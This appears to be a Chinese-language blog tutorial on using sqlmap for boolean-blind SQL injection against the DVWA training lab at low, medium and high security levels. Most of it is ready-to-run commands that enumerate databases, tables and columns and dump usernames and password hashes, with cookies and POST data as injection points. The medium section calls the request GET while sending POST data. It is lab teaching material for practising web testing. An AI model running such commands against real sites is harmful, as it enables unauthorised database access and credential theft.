---
title: sqlmap使用方法与实践
date: '2022/1/23 23:15:01'
categories:
  - - WEB安全
    - 注入
    - SQL
abbrlink: ec5a5683
description: 使用sqlmap对dvwa上面的典型漏洞进行攻击
tags:
---

## sqlmap使用方法与实践

以攻击dvwa的low、medium、high三个难度为例

**知识点：**

> 使用--cookie加入了cookie中的参数
> 使用--dbms指定数据库类型
> 使用--technique指定注入方式（这里的B代表布尔盲注）
> 使用--fresh-queries可以让sqlmap不从缓存中加载数据
> 使用--data通过POST发送数据参数
> 使用*来指定注入点

**注入流程：**

（1）爆破数据库名
```sql
--dbs 
 ```


（2）爆破数据库名为dvwa下的所有表名
```sql
-D dvwa --tables
 ```

（3）爆破数据库名为dvwa、数据表为users下的所有列名
```sql
-D dvwa -T users --columns
 ```

（4）爆破数据库名为dvwa、数据表为users、列名为user、password中的所有数据
```sql
-D dvwa -T users -C user,password --dump
 ```

### low难度
> 这个是get方法

（1）爆破数据库名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --dbms mysql --technique=B --dbs
```

（2）爆破数据库名为dvwa下的所有表名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --dbms mysql --technique=B -D dvwa --tables
```

（3）爆破数据库名为dvwa、数据表为users下的所有列名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --dbms mysql --technique=B -D dvwa -T users --columns
```

（4）爆破数据库名为dvwa、数据表为users、列名为user、password中的所有数据

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --dbms mysql --technique=B -D dvwa -T users -C user,password --dump
```

### medium难度
> 这个是get方法，所以要使用--data通过POST发送数据参数

（1）爆破数据库名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=medium;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --data="id=1&Submit=Submit" --dbms mysql --technique=B --dbs --fresh-queries
```

（2）爆破数据库名为dvwa下的所有表名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=medium;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --data="id=1&Submit=Submit" --dbms mysql --technique=B -D dvwa --tables --fresh-queries
```

（3）爆破数据库名为dvwa、数据表为users下的所有列名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=medium;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --data="id=1&Submit=Submit" --dbms mysql --technique=B -D dvwa -T users --columns --fresh-queries
```

（4）爆破数据库名为dvwa、数据表为users、列名为user、password中的所有数据

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=medium;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3" --data="id=1&Submit=Submit" --dbms mysql --technique=B -D dvwa -T users -C user,password --dump --fresh-queries
```

### high难度
> 注入参数在cookie，使用*来指定cookie中的注入点为id

（1）爆破数据库名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=high;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3;id=1*" --dbms mysql --technique=B --dbs --fresh-queries
```

（2）爆破数据库名为dvwa下的所有表名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=high;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3;id=1*" --dbms mysql --technique=B -D dvwa --tables --fresh-queries
```

（3）爆破数据库名为dvwa、数据表为users下的所有列名

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=high;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3;id=1*" --dbms mysql --technique=B -D dvwa -T users --columns --fresh-queries
```

（4）爆破数据库名为dvwa、数据表为users、列名为user、password中的所有数据

```sql
sqlmap -u "http://this_is_attack_ip/vulnerabilities/sqli_blind/index.php" --cookie="security=high;PHPSESSID=1fuuts4qq35039qt1u4j07uoe3;id=1*" -dbms mysql --technique=B -D dvwa -T users -C user,password --dump --fresh-queries
```
